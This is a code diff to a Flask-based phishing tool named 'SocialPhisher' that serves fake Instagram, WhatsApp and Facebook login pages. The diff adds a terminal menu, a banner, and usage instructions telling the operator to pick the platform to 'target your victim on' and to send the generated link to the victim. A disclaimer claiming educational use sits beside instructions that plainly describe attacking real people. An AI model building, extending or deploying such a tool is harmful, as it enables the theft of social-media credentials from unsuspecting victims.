@@ -1,4 +1,28 @@
 from flask import Flask, render_template_string, request
+import pyfiglet
+ascii_art = pyfiglet.figlet_format("SocialPhisher")
+from colorama import *
+import time
+import os
+
+init()
+definition = """
+SocialPhisher
+SocialPhisher is a phishing tool created by FRn13ds to simulate social engineering attacks using realistic phishing pages.
+It supports multiple platforms and is intended for educational and ethical purposes only. Misuse for illegal activities is strictly prohibited.
+"""
+about ="""
+Instructions:
+First, the tool will provide you with a link that you need to open in your browser on your device.
+Second, choose the social media platform you want to target your victim on.
+Third, copy the link above and send it to the victim
+"""
+goodbye_msg = f"""
+{ascii_art}
+Thank you for using SocialPhisher! Stay safe and use responsibly.
+Goodbye!
+"""
+
 
 app = Flask(__name__)
 
@@ -226,6 +250,13 @@ def index():
     <a href="/instagram"><i class="fab fa-instagram"></i> Instagram</a><br>
     <a href="/whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a><br>
     <a href="/facebook"><i class="fab fa-facebook"></i> Facebook</a><br>
+    <h6 style ="font-family:monospace;">Please choose a social media platform and follow this steps :</h6>
+   <img src="https://i.ibb.co/x2rdGtz/Screenshot-282.png" <="" img="" style="
+    width: 600px;
+">
+<img src="https://i.ibb.co/2N1v1zr/Screenshot-283.png" <="" img="" style="
+    width: 600px;
+">
 </body>
 </html>
 
@@ -357,4 +388,31 @@ def facebook_login():
 '''
 
 if __name__ == '__main__':
-        app.run(host='0.0.0.0', port=5000)
+        time.sleep(2)
+        print(Fore.GREEN + ascii_art)
+        print("                                           V0.2")
+        print(Fore.RED +"Welcome Dear User !... ")
+        enter = input(Style.RESET_ALL +"press any key to continue...")
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(Fore.GREEN + ascii_art)
+        print(Fore.BLUE +"[!] Welcome Again To This Tool ! ")
+        def main():
+             print(Back.MAGENTA +"MENU :",Style.RESET_ALL)
+             print("[1] About The Tool ")
+             print("[2] How To Use ")
+             print("[3] Start ")
+             print("[4] Exit")
+             while True :
+                  choose = input(Fore.LIGHTCYAN_EX +"Select From Menu :")
+                  if choose == "1":
+                       print(Fore.GREEN + definition)
+                  elif choose == "2":
+                       print(Fore.RED + about)
+                  elif choose == "3":
+                       app.run(host='0.0.0.0', port=5000)
+                  elif choose =="4":
+                       print(Fore.CYAN + goodbye_msg)
+                       break 
+                  else :
+                       print(Fore.RED +"Something Went wrong , Try again !")
+main()
